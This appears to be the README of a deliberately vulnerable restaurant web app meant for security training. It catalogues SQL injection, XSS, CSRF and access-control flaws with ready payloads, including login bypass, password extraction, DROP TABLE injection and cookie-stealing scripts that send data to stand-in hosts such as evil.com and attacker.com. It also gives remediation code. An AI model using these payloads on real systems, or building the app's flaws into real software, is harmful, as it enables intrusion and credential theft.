# 🍕 Vulnerable Restaurant Management System

## ⚠️ SECURITY WARNING

**THIS IS A DELIBERATELY VULNERABLE WEB APPLICATION**

This application contains **intentional security flaws** and should **NEVER** be deployed in a production environment or exposed to the public internet without strict network isolation and access controls.

**Purpose**: Security research, penetration testing practice, and educational demonstrations.

---

## 📋 Overview

A vulnerable restaurant management web application built with Node.js/Express and MySQL/Aurora, designed to showcase common web application security vulnerabilities including:

- **SQL Injection**
- **Cross-Site Scripting (XSS)**
- **Broken Access Control**
- **Weak Session Management**
- **Cross-Site Request Forgery (CSRF)**
- **Insecure Direct Object References**
- **Security Misconfiguration**

---

## 🎯 Features

### User Roles
- **Manager**: Full CRUD access to menu items and all orders
- **Employee**: Read-only access to menu and their own orders

### Functionalities
- User authentication (vulnerable login)
- Menu item management
- Order processing system
- Search functionality
- Role-based access (easily bypassed)

---

## 🏗️ Architecture

```
┌─────────────────┐
│   Web Browser   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Node.js/      │
│   Express       │◄─── EC2 Instance (Public Subnet)
│   Application   │
└────────┬────────┘
         │
         ▼
┌─────────────────┐
│   Aurora MySQL  │◄─── Aurora Cluster (Private Subnet)
│   Database      │
└─────────────────┘
```

---

## 🔓 Vulnerabilities Catalog

### 1. SQL Injection

**Location**: Login form, search, all CRUD operations

**Example**:
```sql
-- Login bypass
Username: admin' OR '1'='1'--
Password: anything

-- Data extraction
Search: ' UNION SELECT id,username,password,role FROM users--

-- Privilege escalation
Menu name: Test', 'desc', 1); UPDATE users SET role='manager' WHERE username='employee1';--
```

**Impact**: Complete database compromise, authentication bypass, data theft

---

### 2. Cross-Site Scripting (XSS)

**Location**: All text input fields (menu names, descriptions, search)

**Example**:
```html
<!-- Stored XSS -->
Menu name: <script>alert('XSS')</script>

<!-- Cookie stealing -->
Description: <img src=x onerror="fetch('http://evil.com?c='+document.cookie)">

<!-- Reflected XSS -->
Search: <script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>
```

**Impact**: Session hijacking, credential theft, malicious actions on behalf of users

---

### 3. Broken Access Control

**Location**: Manager-only routes accessible without proper authorization

**Test Cases**:
- Access `/menu/add` as employee or unauthenticated user
- Access `/menu/edit/1` directly via URL
- Modify session cookie to change role from 'employee' to 'manager'
- Delete orders via `/orders/delete/1` without proper permissions

**Impact**: Unauthorized access to sensitive functions, data manipulation

---

### 4. Weak Session Management

**Vulnerabilities**:
- Session data stored client-side (role in session cookie)
- No secure flag on cookies
- No httpOnly flag (susceptible to XSS)
- No sameSite attribute (no CSRF protection)

**Exploitation**:
```javascript
// Modify role via browser console
document.cookie = "role=manager; path=/";
```

**Impact**: Privilege escalation, session hijacking

---

### 5. Cross-Site Request Forgery (CSRF)

**Location**: All state-changing operations (POST/DELETE requests)

**Example Attack**:
```html
<!-- Malicious page that deletes menu item -->
<img src="http://vulnerable-app:3000/menu/delete/1">

<!-- CSRF to add malicious menu item -->
<form action="http://vulnerable-app:3000/menu/add" method="POST">
  <input name="name" value="Malicious Item">
  <input name="description" value="<script>alert('XSS')</script>">
  <input name="price" value="0.01">
</form>
<script>document.forms[0].submit();</script>
```

**Impact**: Unauthorized actions performed on behalf of authenticated users

---

### 6. Plain Text Password Storage

**Vulnerability**: Passwords stored without hashing in database

**Exploitation**:
```sql
-- Extract all passwords via SQL injection
' UNION SELECT 1,username,password,role FROM users--
```

**Impact**: Complete credential compromise

---

### 7. Information Disclosure

**Vulnerability**: Detailed error messages reveal database structure

**Example**:
- SQL errors displayed to user
- Stack traces visible
- Database schema exposed through error messages

---

## 📦 Installation

### Prerequisites
- Node.js 16+ 
- MySQL 8.0+ or AWS Aurora MySQL
- npm or yarn

### Local Setup

1. **Clone the repository**
```bash
git clone <repository-url>
cd vulnerable-restaurant
```

2. **Install dependencies**
```bash
npm install
```

3. **Setup database**
```bash
# Create database and tables
mysql -u root -p < setup.sql
```

4. **Configure environment**
```bash
# Create .env file
cat > .env << EOF
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=your_password
DB_NAME=restaurant_db
NODE_ENV=development
EOF
```

5. **Start application**
```bash
npm start
# Application runs on http://localhost:3000
```

---

## ☁️ AWS Deployment

See [DEPLOYMENT_GUIDE.md](DEPLOYMENT_GUIDE.md) for detailed AWS deployment instructions including:
- VPC and network setup
- EC2 instance configuration
- Aurora MySQL cluster setup
- Security group configuration
- Complete step-by-step guide

---

## 🧪 Testing Guide

### Test Credentials

| Username   | Password     | Role     |
|------------|--------------|----------|
| admin      | admin123     | manager  |
| manager1   | manager      | manager  |
| employee1  | employee123  | employee |
| employee2  | pass123      | employee |

### SQL Injection Testing

1. **Login Bypass**
   - Username: `admin' OR '1'='1'--`
   - Password: anything

2. **Data Extraction**
   - Search: `' UNION SELECT id,username,password,1 FROM users--`

3. **Database Modification**
   - Menu name: `Test'); DROP TABLE menu_items;--`

### XSS Testing

1. **Stored XSS**
   - Add menu item with name: `<script>alert('Stored XSS')</script>`

2. **Reflected XSS**
   - Search: `<img src=x onerror=alert('Reflected XSS')>`

3. **Cookie Theft**
   - Description: `<script>fetch('http://attacker.com?c='+document.cookie)</script>`

### Access Control Testing

1. **URL Manipulation**
   - Login as employee
   - Access: `http://localhost:3000/menu/add`
   - Access: `http://localhost:3000/orders/delete/1`

2. **Session Manipulation**
   - Login as employee
   - Open browser console
   - Modify session: `document.cookie = "role=manager"`
   - Refresh page

### CSRF Testing

1. Create `csrf-attack.html`:
```html
<!DOCTYPE html>
<html>
<body>
  <h1>CSRF Attack Demo</h1>
  <img src="http://localhost:3000/menu/delete/1">
  <p>If you're logged in, menu item 1 will be deleted!</p>
</body>
</html>
```

2. Login to app in one tab
3. Open `csrf-attack.html` in another tab

---

## 🔐 Security Remediations

### For Educational Reference Only

#### SQL Injection Prevention
```javascript
// BAD (Current vulnerable code)
const query = `SELECT * FROM users WHERE username = '${username}'`;

// GOOD (Use parameterized queries)
const query = 'SELECT * FROM users WHERE username = ?';
db.query(query, [username], callback);
```

#### XSS Prevention
```javascript
// BAD (Current vulnerable code)
<h3><%= item.name %></h3>

// GOOD (Escape output)
<h3><%- escapeHtml(item.name) %></h3>

// Or use framework's built-in escaping
<h3>{{{item.name}}}</h3> // Handlebars
```

#### Access Control
```javascript
// Add middleware for role checking
function requireRole(role) {
  return (req, res, next) => {
    if (!req.session.user) {
      return res.redirect('/login');
    }
    if (req.session.user.role !== role) {
      return res.status(403).send('Forbidden');
    }
    next();
  };
}

app.get('/menu/add', requireRole('manager'), (req, res) => {
  // Handler code
});
```

#### CSRF Protection
```javascript
// Install and configure csrf middleware
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.use(csrfProtection);

// Add token to forms
<input type="hidden" name="_csrf" value="<%= csrfToken %>">
```

#### Password Hashing
```javascript
const bcrypt = require('bcrypt');

// Hash password
const hashedPassword = await bcrypt.hash(password, 10);

// Verify password
const match = await bcrypt.compare(password, hashedPassword);
```

---

## 📊 Routes

| Path | Method | Access | Vulnerability |
|------|--------|--------|---------------|
| `/login` | POST | Public | SQL Injection |
| `/logout` | GET | Auth | - |
| `/menu` | GET | All | - |
| `/menu/add` | GET/POST | Manager | SQLi, XSS, Access Control |
| `/menu/edit/:id` | GET/POST | Manager | SQLi, XSS, Access Control |
| `/menu/delete/:id` | POST | Manager | SQLi, CSRF, Access Control |
| `/orders` | GET | Auth | SQLi |
| `/orders/add` | GET/POST | Auth | SQLi |
| `/orders/delete/:id` | POST | Manager | SQLi, CSRF |
| `/search` | GET | All | SQLi, XSS |

---

## 🗄️ Database Schema

### Users Table
```sql
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  username VARCHAR(50) UNIQUE,
  password VARCHAR(255),  -- Stored in plain text!
  role ENUM('manager', 'employee')
);
```

### Menu Items Table
```sql
CREATE TABLE menu_items (
  id INT PRIMARY KEY AUTO_INCREMENT,
  name VARCHAR(100),
  description TEXT,
  price DECIMAL(5,2)
);
```

### Orders Table
```sql
CREATE TABLE orders (
  id INT PRIMARY KEY AUTO_INCREMENT,
  user_id INT,
  item_id INT,
  quantity INT,
  order_time TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
  FOREIGN KEY (user_id) REFERENCES users(id),
  FOREIGN KEY (item_id) REFERENCES menu_items(id)
);
```

---

## 🎓 Learning Resources

### OWASP Resources
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [OWASP XSS](https://owasp.org/www-community/attacks/xss/)

### Tools for Testing
- **Burp Suite**: Web vulnerability scanner
- **OWASP ZAP**: Security testing tool
- **SQLMap**: SQL injection tool
- **XSSer**: XSS testing framework

---

## ⚖️ Legal & Ethical Guidelines

### Important Notes

1. **Authorization Required**: Only test systems you own or have explicit permission to test
2. **Educational Purpose**: This application is for learning cybersecurity concepts
3. **No Malicious Use**: Do not use these techniques for unauthorized access
4. **Responsible Disclosure**: If you find vulnerabilities in real systems, report them responsibly
5. **Compliance**: Ensure compliance with all applicable laws and regulations

### Disclaimer

The authors and contributors of this project:
- Provide this application AS-IS for educational purposes only
- Accept NO liability for misuse or damages
- Do NOT condone unauthorized access or malicious activities
- Recommend consulting legal counsel before conducting security testing

---

## 🤝 Contributing

This is an educational project. Contributions that add new vulnerability examples or improve documentation are welcome.

### Guidelines
- Clearly document all vulnerabilities
- Provide exploitation examples
- Include remediation guidance
- Update testing documentation

---

## 📄 License

MIT License - See LICENSE file for details

---

## 📞 Support

For educational inquiries or to report issues:
- Open an issue on GitHub
- Provide detailed reproduction steps
- Include relevant logs and screenshots

---

## 🙏 Acknowledgments

This project is inspired by:
- OWASP WebGoat
- DVWA (Damn Vulnerable Web Application)
- Security training platforms like Hack The Box and TryHackMe

---

**Remember**: With great power comes great responsibility. Use this knowledge to build more secure applications and protect systems, not to harm them.